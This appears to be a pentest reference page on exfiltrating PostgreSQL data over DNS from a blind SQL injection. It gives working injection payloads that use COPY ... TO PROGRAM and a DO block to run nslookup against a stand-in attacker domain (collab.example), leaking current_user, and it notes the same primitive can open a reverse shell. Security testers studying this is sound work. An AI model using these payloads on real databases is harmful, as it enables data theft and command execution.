---
title: "Out-of-band exfiltration from PostgreSQL injection"
description: "Exfiltrating PostgreSQL data over DNS using COPY ... TO PROGRAM and a dynamic command built in a DO block, for blind injections with program execution rights."
keywords:
  - out of band
  - DNS exfiltration
  - COPY TO PROGRAM
  - nslookup
  - PostgreSQL OOB
---

# Out-of-band

When nothing is reflected and timing is too slow, a role with program-execution rights can push data out over the network. PostgreSQL has no built-in HTTP or DNS function, but `COPY ... TO PROGRAM` runs a shell command, and a command that resolves a crafted hostname leaks data to an attacker name server. This needs a superuser or the `pg_execute_server_program` role.

A fixed command first confirms both program execution and outbound DNS:

```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup confirm.collab.example'-- 
```

To carry data, the hostname must include the value to steal, which means building the command string dynamically. A `DO` block reads the value into a variable and assembles the command with `EXECUTE`:

```sql
'; DO $$ DECLARE p text; BEGIN SELECT current_user INTO p; EXECUTE 'COPY (SELECT '''') TO PROGRAM ''nslookup '||p||'.collab.example'''; END $$-- 
```

The attacker's name server for `collab.example` logs `<current_user>.collab.example`, revealing the value. Longer or non-DNS-safe values are encoded (for example hex via `encode(...,'hex')`) and split across labels. A listener such as Burp Collaborator acts as the logging name server.

Because it runs a real command, this is also a stepping stone to full command execution: the same `COPY ... TO PROGRAM` that resolves a name can start a reverse shell. Out-of-band is simply the lowest-footprint use of that primitive for a blind target.

## References

- PostgreSQL Documentation: COPY ... TO PROGRAM, DO, EXECUTE
- OWASP Testing Guide: Testing for SQL Injection
